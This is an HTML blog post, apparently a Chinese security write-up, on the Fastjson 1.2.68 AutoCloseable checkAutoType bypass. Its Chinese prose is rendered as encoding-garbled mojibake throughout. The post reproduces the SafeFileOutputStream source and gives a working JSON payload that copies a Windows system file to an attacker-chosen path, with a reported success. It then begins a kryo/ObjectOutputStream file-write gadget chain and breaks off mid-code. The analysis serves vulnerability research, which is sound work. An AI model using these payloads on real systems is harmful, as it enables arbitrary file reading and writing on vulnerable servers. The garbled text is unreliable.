alt="image-20230828002929465"><br>ÂæÄ‰∏ãÔºåÂà§Êñ≠ÊòØÂê¶jsonTypeÔºåtrueÁöÑËØùÁõ¥Êé•Ê∑ªÂä†MappingÁºìÂ≠òÂπ∂ËøîÂõûÁ±ªÔºåÂê¶ÂàôÊé•ÁùÄÂà§Êñ≠ËøîÂõûÁöÑÁ±ªÊòØÂê¶ÊòØClassLoader„ÄÅDataSource„ÄÅRowSetÁ≠âÁ±ªÁöÑÂ≠êÁ±ªÔºåÊòØÁöÑËØùÁõ¥Êé•ÊäõÂá∫ÂºÇÂ∏∏ÔºåËøô‰πüÊòØËøáÊª§Â§ßÂ§öÊï∞JNDIÊ≥®ÂÖ•GadgetÁöÑÊú∫Âà∂Ôºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280029497.png" alt="image-20230828002952920"><br>ÂâçÈù¢ÁöÑÈÉΩËÉΩÈÄöËøáÔºåÂæÄ‰∏ãÔºåÂ¶ÇÊûúexpectClass‰∏ç‰∏∫nullÔºåÂàôÂà§Êñ≠ÁõÆÊ†áÁ±ªÊòØÂê¶ÊòØexpectClassÁ±ªÁöÑÂ≠êÁ±ªÔºåÊòØÁöÑËØùÂ∞±Ê∑ªÂä†Âà∞MappingÁºìÂ≠ò‰∏≠Âπ∂Áõ¥Êé•ËøîÂõûËØ•ÁõÆÊ†áÁ±ªÔºåÂê¶ÂàôÁõ¥Êé•ÊäõÂá∫ÂºÇÂ∏∏ÂØºËá¥Âà©Áî®Â§±Ë¥•Ôºå<strong>ËøôÈáåÂ∞±Ëß£Èáä‰∫Ü‰∏∫‰ªÄ‰πàÊÅ∂ÊÑèÁ±ªÂøÖÈ°ªË¶ÅÁªßÊâøAutoCloseableÊé•Âè£Á±ªÔºåÂõ†‰∏∫ËøôÈáåexpectClass‰∏∫AutoCloseableÁ±ª„ÄÅÂõ†Ê≠§ÊÅ∂ÊÑèÁ±ªÂøÖÈ°ªÊòØAutoCloseableÁ±ªÁöÑÂ≠êÁ±ªÊâçËÉΩÈÄöËøáËøôÈáåÁöÑÂà§Êñ≠</strong>Ôºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280030610.png" alt="image-20230828003010006"><br><code>checkAutoType()</code>Ë∞ÉÁî®ÂÆåËøîÂõûÁ±ª‰πãÂêéÔºåÂ∞±ËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰Ωú„ÄÅÊñ∞Âª∫ÊÅ∂ÊÑèÁ±ªÂÆû‰æãËøõËÄåË∞ÉÁî®ÂÖ∂ÊûÑÈÄ†ÂáΩÊï∞‰ªéËÄåÊàêÂäüËß¶ÂèëÊºèÊ¥ûÔºö<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280030655.png" alt="image-20230828003031002"><br>Â∞èÁªìÔºö<br>Á¨¨‰∏Ä‰∏™ <code>@type</code> ÊòØ‰Ωú‰∏∫Á¨¨‰∫å‰∏™ÊåáÂÆöÁöÑÁ±ªÈáåÈù¢ÁöÑ expectClassÔºåÂπ∂‰∏îÈúÄË¶ÅÂä†ËΩΩÁöÑÁõÆÊ†áÁ±ªÊòØexpectClassÁ±ªÁöÑÂ≠êÁ±ªÊàñËÄÖÂÆûÁé∞Á±ªËøôÂ∞±ÊòØÊûÑÈÄ†ÊÅ∂ÊÑèÁ±ª‰∏∫‰ªÄ‰πàVulAutoCloseable(ÁªßÊâøÊàñËÄÖ)ÂÆûÁé∞AutoCloseableÁ±ª Ôºà‰∏çÂú®ÈªëÂêçÂçï‰∏≠ÔºâÔºåÂΩì‰º†ÂÖ•<code>checkAutoType()</code>ÂáΩÊï∞ÁöÑexpectClassÂèÇÊï∞‰∏ç‰∏∫nullÔºåÂπ∂‰∏îÈúÄË¶ÅÂä†ËΩΩÁöÑÁõÆÊ†áÁ±ªÊòØexpectClassÁ±ªÁöÑÂ≠êÁ±ªÊàñËÄÖÂÆûÁé∞Á±ªÊó∂Ôºà‰∏çÂú®ÈªëÂêçÂçï‰∏≠ÔºâÔºåÂ∞±Â∞ÜÈúÄË¶ÅÂä†ËΩΩÁöÑÁõÆÊ†áÁ±ªÂΩìÂÅöÊòØÊ≠£Â∏∏ÁöÑÁ±ªÁÑ∂ÂêéÈÄöËøáË∞ÉÁî®<code>TypeUtils.loadClass()</code>ÂáΩÊï∞ËøõË°åÂä†ËΩΩ„ÄÇ</p><h3 id="ÂÆûÈôÖÂà©Áî®"><a href="#ÂÆûÈôÖÂà©Áî®" class="headerlink" title="ÂÆûÈôÖÂà©Áî®"></a>ÂÆûÈôÖÂà©Áî®</h3><p>ËøôÈáåÂ∞±ÊòØÊâæ‰∏Ä‰∏ãÂÆûÈôÖ‰∏≠ÂèØÂà©Áî®ÁöÑÁ±ªÔºåÂõ†‰∏∫‰∏äÈù¢ÊòØËá™Â∑±ÊûÑÈÄ†ÁöÑÈ™åËØÅ‰∏Ä‰∏ãÂèØË°åÊÄß<br>ÂØªÊâæÂÖ≥‰∫éËæìÂÖ•ËæìÂá∫ÊµÅÁöÑÁ±ªÊù•ÂÜôÊñá‰ª∂ÔºåIntputStreamÂíåOutputStreamÈÉΩÊòØÂÆûÁé∞‰∫ÜAutoCloseableÊé•Âè£ÁöÑ„ÄÇ<br>Â§ß‰Ω¨ÂØªÊâæ gadget Êó∂ÁöÑÊù°‰ª∂ÊòØËøôÊ†∑ÁöÑ„ÄÇ</p><ul><li>ÈúÄË¶Å‰∏Ä‰∏™ÈÄöËøá set ÊñπÊ≥ïÊàñÊûÑÈÄ†ÊñπÊ≥ïÊåáÂÆöÊñá‰ª∂Ë∑ØÂæÑÁöÑ OutputStream</li><li>ÈúÄË¶Å‰∏Ä‰∏™ÈÄöËøá set ÊñπÊ≥ïÊàñÊûÑÈÄ†ÊñπÊ≥ï‰º†ÂÖ•Â≠óËäÇÊï∞ÊçÆÁöÑ OutputStreamÔºåÂèÇÊï∞Á±ªÂûãÂøÖÈ°ªÊòØbyte<code>[]</code>„ÄÅByteBuffer„ÄÅString„ÄÅchar<code>[]</code>ÂÖ∂‰∏≠ÁöÑ‰∏Ä‰∏™ÔºåÂπ∂‰∏îÂèØ‰ª•ÈÄöËøá set ÊñπÊ≥ïÊàñÊûÑÈÄ†ÊñπÊ≥ï‰º†ÂÖ•‰∏Ä‰∏™ OutputStreamÔºåÊúÄÂêéÂèØ‰ª•ÈÄöËøá write ÊñπÊ≥ïÂ∞Ü‰º†ÂÖ•ÁöÑÂ≠óËäÇÁ†Å write Âà∞‰º†ÂÖ•ÁöÑ OutputStream</li><li>ÈúÄË¶Å‰∏Ä‰∏™ÈÄöËøá set ÊñπÊ≥ïÊàñÊûÑÈÄ†ÊñπÊ≥ï‰º†ÂÖ•‰∏Ä‰∏™ OutputStreamÔºåÂπ∂‰∏îÂèØ‰ª•ÈÄöËøáË∞ÉÁî® toString„ÄÅhashCode„ÄÅget„ÄÅset„ÄÅÊûÑÈÄ†ÊñπÊ≥ï Ë∞ÉÁî®‰º†ÂÖ•ÁöÑ OutputStream ÁöÑ close„ÄÅwrite Êàñ flush ÊñπÊ≥ï<br>‰ª•‰∏ä‰∏â‰∏™ÁªÑÂêàÂú®‰∏ÄËµ∑Â∞±ËÉΩÊûÑÈÄ†Êàê‰∏Ä‰∏™ÂÜôÊñá‰ª∂ÁöÑÂà©Áî®ÈìæÔºåÊàëÈÄöËøáÊâ´Êèè‰∫Ü‰∏Ä‰∏ã JDK ÔºåÊâæÂà∞‰∫ÜÁ¨¶ÂêàÁ¨¨‰∏Ä‰∏™ÂíåÁ¨¨‰∏â‰∏™Êù°‰ª∂ÁöÑÁ±ª„ÄÇ<br>ÂàÜÂà´ÊòØ FileOutputStream Âíå ObjectOutputStreamÔºå‰ΩÜËøô‰∏§‰∏™Á±ªÈÄâÂèñÁöÑÊûÑÈÄ†Âô®Ôºå‰∏çÁ¨¶ÂêàÊÉÖÂÜµÔºåÊâÄ‰ª•Âè™ËÉΩÊâæÂà∞Ëøô‰∏§‰∏™Á±ªÁöÑÂ≠êÁ±ªÔºåÊàñËÄÖÂäüËÉΩÁõ∏ÂêåÁöÑÁ±ª„ÄÇ</li></ul><h4 id="Â§çÂà∂Êñá‰ª∂Ôºà‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºâ"><a href="#Â§çÂà∂Êñá‰ª∂Ôºà‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºâ" class="headerlink" title="Â§çÂà∂Êñá‰ª∂Ôºà‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºâ"></a>Â§çÂà∂Êñá‰ª∂Ôºà‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºâ</h4><p>Âà©Áî®Á±ªÔºö<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong><br>‰æùËµñÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>Áúã‰∏ãSafeFileOutputStreamÁ±ªÁöÑÊ∫êÁ†ÅÔºåÂÖ∂<code>SafeFileOutputStream(java.lang.String, java.lang.String)</code>ÊûÑÈÄ†ÂáΩÊï∞Âà§Êñ≠‰∫ÜÂ¶ÇÊûútargetPathÊñá‰ª∂‰∏çÂ≠òÂú®‰∏îtempPathÊñá‰ª∂Â≠òÂú®ÔºåÂ∞±‰ºöÊäätempPathÂ§çÂà∂Âà∞targetPath‰∏≠ÔºåÊ≠£ÊòØÂà©Áî®ÂÖ∂ÊûÑÈÄ†ÂáΩÊï∞ÁöÑËøô‰∏™ÁâπÁÇπÊù•ÂÆûÁé∞WebÂú∫ÊôØ‰∏ãÁöÑ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeFileOutputStream</span> <span class="keyword">extends</span> <span class="title class_">OutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> File temp;</span><br><span class="line">    <span class="keyword">protected</span> File target;</span><br><span class="line">    <span class="keyword">protected</span> OutputStream output;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> failed;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXTENSION</span> <span class="operator">=</span> <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>(file.getAbsolutePath(), (String)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// ËØ•ÊûÑÈÄ†ÂáΩÊï∞Âà§Êñ≠Â¶ÇÊûútargetPathÊñá‰ª∂‰∏çÂ≠òÂú®‰∏îtempPathÊñá‰ª∂Â≠òÂú®ÔºåÂ∞±‰ºöÊäätempPathÂ§çÂà∂Âà∞targetPath‰∏≠</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(String targetPath, String tempPath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.failed = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.target = <span class="keyword">new</span> <span class="title class_">File</span>(targetPath);</span><br><span class="line">        <span class="built_in">this</span>.createTempFile(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.target.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.target));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.temp));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.failed) &#123;</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.commit();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.target.delete();</span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(File sourceFile, File destinationFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (sourceFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!sourceFile.renameTo(destinationFile)) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">source</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">BufferedOutputStream</span> <span class="variable">destination</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    source = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(sourceFile));</span><br><span class="line">                    destination = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destinationFile));</span><br><span class="line">                    <span class="built_in">this</span>.transferStreams(source, destination);</span><br><span class="line">                    destination.close();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    FileUtil.safeClose(source);</span><br><span class="line">                    FileUtil.safeClose(destination);</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createTempFile</span><span class="params">(String tempPath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempPath == <span class="literal">null</span>) &#123;</span><br><span class="line">            tempPath = <span class="built_in">this</span>.target.getAbsolutePath() + <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">this</span>.temp = <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTempFilePath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.temp.getAbsolutePath();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">transferStreams</span><span class="params">(InputStream source, OutputStream destination)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> source.read(buffer);</span><br><span class="line">            <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            destination.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.write(b);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>expÂ¶Ç‰∏ãÔºåËøôÈáå‰∏çÂæó‰∏çËØ¥‰æùËµñÂØºÁöÑÁúüÊÖ¢ÔºåÊàë‰∏ãËΩΩÂú∞ÂùÄÈÉΩÊç¢Êàê‰∫ÜÂõΩÂÜÖÁöÑ‰∫ÜËøòËøô‰πàÊÖ¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.localstore.SafeFileOutputStream;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;E:/flag.txt\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280030079.png" alt="image-20230828003050698"><br>ËøôÈáåÊàêÂäüËá™Âä®ÁîüÊàê‰∫Üflag.txtÂπ∂‰∏îÊääwin.iniÂ§çÂà∂‰∫Ü‰∏ãÊù•</p><h4 id="ÂÜôÂÖ•Êñá‰ª∂"><a href="#ÂÜôÂÖ•Êñá‰ª∂" class="headerlink" title="ÂÜôÂÖ•Êñá‰ª∂"></a>ÂÜôÂÖ•Êñá‰ª∂</h4><p>ÂÜôÂÜÖÂÆπÁ±ªÔºö<strong>com.esotericsoftware.kryo.io.Output</strong><br>‰æùËµñÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>OutputÁ±ª‰∏ªË¶ÅÁî®Êù•ÂÜôÂÜÖÂÆπÔºåÂÆÉÊèê‰æõ‰∫Ü<code>setBuffer()</code>Âíå<code>setOutputStream()</code>‰∏§‰∏™setterÊñπÊ≥ïÂèØ‰ª•Áî®Êù•ÂÜôÂÖ•ËæìÂÖ•ÊµÅÔºåÂÖ∂‰∏≠bufferÂèÇÊï∞ÂÄºÊòØÊñá‰ª∂ÂÜÖÂÆπÔºåoutputStreamÂèÇÊï∞ÂÄºÂ∞±ÊòØÂâçÈù¢ÁöÑSafeFileOutputStreamÁ±ªÂØπË±°ÔºåËÄåË¶ÅËß¶ÂèëÂÜôÊñá‰ª∂Êìç‰ΩúÂàôÈúÄË¶ÅË∞ÉÁî®ÂÖ∂<code>flush()</code>ÂáΩÊï∞Ôºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outputStream May be null. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setOutputStream</span> <span class="params">(OutputStream outputStream)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.outputStream = outputStream;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">    total = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Sets the buffer that will be written to. &#123;<span class="doctag">@link</span> #setBuffer(byte[], int)&#125; is called with the specified buffer&#x27;s length as the</span></span><br><span class="line"><span class="comment"> * maxBufferSize. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBuffer</span> <span class="params">(<span class="type">byte</span>[] buffer)</span> &#123;</span><br><span class="line">    setBuffer(buffer, buffer.length);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"><span class="comment">/** Writes the buffered bytes to the underlying OutputStream, if any. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span> <span class="params">()</span> <span class="keyword">throws</span> KryoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (outputStream == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        outputStream.write(buffer, <span class="number">0</span>, position);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KryoException</span>(ex);</span><br><span class="line">    &#125;</span><br><span class="line">    total += position;</span><br><span class="line">    position = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Êé•ÁùÄÔºåÂ∞±ÊòØË¶ÅÁúãÊÄé‰πàËß¶ÂèëOutputÁ±ª<code>flush()</code>ÂáΩÊï∞‰∫ÜÔºå<code>flush()</code>ÂáΩÊï∞Âè™ÊúâÂú®<code>close()</code>Âíå<code>require()</code>ÂáΩÊï∞Ë¢´Ë∞ÉÁî®Êó∂Êâç‰ºöËß¶ÂèëÔºåÂÖ∂‰∏≠<code>require()</code>ÂáΩÊï∞Âú®Ë∞ÉÁî®writeÁõ∏ÂÖ≥ÂáΩÊï∞Êó∂‰ºöË¢´Ëß¶Âèë„ÄÇ<br>ÂÖ∂‰∏≠ÔºåÊâæÂà∞JDKÁöÑObjectOutputStreamÁ±ªÔºåÂÖ∂ÂÜÖÈÉ®Á±ªBlockDataOutputStreamÁöÑÊûÑÈÄ†ÂáΩÊï∞‰∏≠Â∞ÜOutputStreamÁ±ªÂûãÂèÇÊï∞ËµãÂÄºÁªôoutÊàêÂëòÂèòÈáèÔºåËÄåÂÖ∂<code>setBlockDataMode()</code>ÂáΩÊï∞‰∏≠Ë∞ÉÁî®‰∫Ü<code>drain()</code>ÂáΩÊï∞„ÄÅ<code>drain()</code>ÂáΩÊï∞‰∏≠ÂèàË∞ÉÁî®‰∫Ü<code>out.write()</code>ÂáΩÊï∞ÔºåÊª°Ë∂≥ÂâçÈù¢ÁöÑÈúÄÊ±ÇÔºö</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 